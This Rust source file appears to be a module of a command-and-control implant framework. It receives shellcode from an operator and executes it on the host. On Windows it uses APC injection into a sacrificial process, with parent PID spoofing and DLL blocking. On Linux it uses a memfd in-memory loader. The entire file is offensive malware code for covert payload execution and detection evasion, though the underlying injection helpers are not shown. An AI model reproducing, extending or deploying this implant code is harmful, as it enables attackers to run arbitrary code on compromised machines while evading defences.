use crate::{check_request, to_error, Module, Result, TaskResult};
use async_trait::async_trait;
use malefic_helper::common::format_cmdline;
use malefic_helper::protobuf::implantpb::spite::Body;
use malefic_helper::protobuf::implantpb::AssemblyResponse;
use malefic_trait::module_impl;

pub struct ExecuteShellcode {}

#[async_trait]
#[module_impl("execute_shellcode")]
impl Module for ExecuteShellcode {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        sender: &mut crate::Output,
    ) -> Result {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let bin = request.bin;
        let sacrifice = request.sacrifice;
        let params = request.args;
        let process_name = request.process_name;
        let mut is_need_sacrifice = false;
        let mut ppid = 0;
        let mut is_block_dll = false;
        let mut ret: Vec<u8> = Vec::new();
        let par = format_cmdline(process_name, params);
        
        unsafe {
            if sacrifice.is_some() {
                let sacrifice = sacrifice.unwrap();
                is_need_sacrifice = true;
                ppid = sacrifice.ppid;
                is_block_dll = sacrifice.block_dll;
            }
            #[cfg(target_os = "windows")]
            {
                ret = to_error!(malefic_helper::win::loader::apc::loader(
                    bin,
                    is_need_sacrifice,
                    par.as_ptr() as _,
                    ppid,
                    is_block_dll
                ))?;
            }
            #[cfg(target_os = "linux")]
            {
                ret = to_error!(malefic_helper::linux::loader::memfd::loader(
                    bin,
                    request.output
                ))?;
            }
        }

        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(AssemblyResponse{
            status: 0,
            data: ret,
            err: "".to_string(),
        })))
    }
}